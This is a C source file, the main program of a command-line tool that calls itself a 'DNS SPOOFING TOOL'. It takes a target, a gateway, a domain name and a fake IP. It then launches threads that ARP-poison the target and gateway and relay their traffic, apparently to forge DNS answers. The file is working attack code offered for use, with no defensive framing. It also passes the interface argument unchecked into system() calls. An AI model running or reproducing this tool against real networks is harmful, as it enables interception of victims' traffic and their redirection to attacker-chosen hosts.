#include "arpspoof.h"
#include "dnsspoof.h"
#include "utils.h"
#include <pthread.h>

void usage();
void* detect_ctrlD(void* interface);

int main(int argc, char** argv[]){
    if(argc != 6)
        usage();

    uint8_t *ip_target = (uint8_t*) calloc(4, sizeof(uint8_t));
    uint8_t *ip_gateway = (uint8_t*) calloc(4, sizeof(uint8_t));
    uint8_t* ip_dns_fake = (uint8_t*) calloc(4, sizeof(uint8_t));

 
    char interface[IFNAMSIZ];
    char qname[REQUEST_SIZE];
    strcpy(interface, argv[1]);

    sscanf(argv[2], "%hhd.%hhd.%hhd.%hhd",
                    (uint8_t *) ip_target,
                    (uint8_t *) (ip_target+1),
                    (uint8_t *) (ip_target+2),
                    (uint8_t *) (ip_target+3));
    sscanf(argv[3], "%hhd.%hhd.%hhd.%hhd",
                    (uint8_t *) ip_gateway,
                    (uint8_t *) (ip_gateway+1),
                    (uint8_t *) (ip_gateway+2),
                    (uint8_t *) (ip_gateway+3));     
    strcpy(qname, argv[4]);

    sscanf(argv[5], "%hhd.%hhd.%hhd.%hhd",
                (uint8_t *) ip_dns_fake,
                (uint8_t *) (ip_dns_fake+1),
                (uint8_t *) (ip_dns_fake+2),
                (uint8_t *) (ip_dns_fake+3));     

    pthread_t detect_ctrl_D;
    pthread_create(&detect_ctrl_D, NULL, detect_ctrlD, (void*) &interface);
    sleep(1);

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //this socket to get info about interface, not to catch packet
    if(fd < 0){
        fprintf(stderr, "Error in creating fd socket\n");
        return -1;
    }

    struct ifreq if_idx, if_mac, if_ip;

    //copy :()
    memset(&if_mac, 0, sizeof(struct ifreq));
    memset(&if_idx, 0, sizeof(struct ifreq));
    memset(&if_ip, 0, sizeof(struct ifreq));


    /* Get the index of the interface to send on */
	strncpy(if_idx.ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0)
	    perror("SIOCGIFINDEX");

	/* Get the MAC address of the interface to send on */

	strncpy(if_mac.ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0)
	    perror("SIOCGIFHWADDR");

     /* Get the IP of the interface to send on */
	
	strncpy(if_ip.ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(fd, SIOCGIFADDR, &if_ip) < 0)
	    perror("SIOCGIFADDR");
    //

    uint8_t *my_ip = (uint8_t*) calloc(4, sizeof(uint8_t));
    uint8_t *my_mac = (uint8_t*) calloc(ETH_ALEN, sizeof(uint8_t));
    int i;
    for(i=0;i<6;i++)
        *(my_mac+i) = if_mac.ifr_hwaddr.sa_data[i];
    for(i=2;i<6;i++)
        *(my_ip+i-2) = if_ip.ifr_addr.sa_data[i];



    struct sockaddr_ll socket_address;
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;
    socket_address.sll_family = AF_PACKET;
    unsigned int addr_len = (unsigned int) sizeof(struct sockaddr_ll);



    uint8_t *target_mac, *gateway_mac;
    fprintf(stderr, "Collecting data...\n");
    target_mac = get_mac(fd, socket_address, addr_len, my_mac, my_ip, ip_target);
    gateway_mac = get_mac(fd, socket_address, addr_len, my_mac, my_ip, ip_gateway);
    close(fd);

    fprintf(stderr, "Attacker:\tMAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\t\t", *my_mac, *(my_mac+1), *(my_mac+2), *(my_mac+3), *(my_mac+4), *(my_mac+5));
    fprintf(stderr, "IP: %d.%d.%d.%d\n", *my_ip, *(my_ip+1), *(my_ip+2), *(my_ip+3));
    fprintf(stderr, "Target: \tMAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\t\t", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));
    fprintf(stderr, "IP: %d.%d.%d.%d\n", *ip_target, *(ip_target+1), *(ip_target+2), *(ip_target+3));
    fprintf(stderr, "Gateway: \tMAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\t\t", *gateway_mac, *(gateway_mac+1), *(gateway_mac+2), *(gateway_mac+3), *(gateway_mac+4), *(gateway_mac+5));
    fprintf(stderr, "IP: %d.%d.%d.%d\n", *ip_gateway, *(ip_gateway+1), *(ip_gateway+2), *(ip_gateway+3));
    fprintf(stderr, "DNS SPOOF:\tQNAME: %s\t\t", qname);
    fprintf(stderr, "IP: %d.%d.%d.%d\n", *ip_dns_fake, *(ip_dns_fake+1), *(ip_dns_fake+2), *(ip_dns_fake+3));
    //start arp attack
    pthread_t arpspoof, tar_to_gtw, gtw_to_tar;
 
    attacking_args_t *args = (attacking_args_t*) malloc(sizeof(attacking_args_t));

    args->socket_address = socket_address;
    args->addr_len = addr_len;
    args->my_mac = my_mac;
    args->target_mac = target_mac;
    args->gateway_ip = ip_gateway;
    args->target_ip = ip_target;
    args->gateway_mac = gateway_mac;
    args->my_ip = my_ip;
    args->ip_dns_fake = ip_dns_fake;
    args->qname = qname;

    fprintf(stderr, "Attacking...\n");
    pthread_create(&arpspoof, NULL, arp_spoofing, (void*) args);
    pthread_create(&tar_to_gtw, NULL, target_to_gateway, (void*) args);
    pthread_create(&gtw_to_tar, NULL, gateway_to_target, (void*) args);


    pthread_join(arpspoof, NULL);
    pthread_join(tar_to_gtw, NULL);
    pthread_join(gtw_to_tar, NULL);
    pthread_join(detect_ctrl_D, NULL);

    free(args);

}

void usage()
{   
    fprintf(stderr, "DNS SPOOFING TOOL\nAuthor: sonnh\n");
    fprintf(stderr, "Usage: ./spoof <interface> <target> <gateway> <qname> <dns ip>\n");
    exit(0);
}
void* detect_ctrlD(void* interface){
    char* iface = (char*) interface;
    char cmd[1024];
    memset(cmd, 0, 1024);
    sprintf(cmd, "ip link set dev %s arp off", iface);
    system(cmd);
    fprintf(stderr, "Turned off ARP of %s\n", iface);
    char c;
    c = getc(stdin);
    if( c == -1){

        memset(cmd, 0, 1024);
        sprintf(cmd, "ip link set dev %s arp on", iface);
        system(cmd);
        fprintf(stderr, "\nTurning ARP on and exit\n");
        usleep(100000);
        exit(0);
    }
}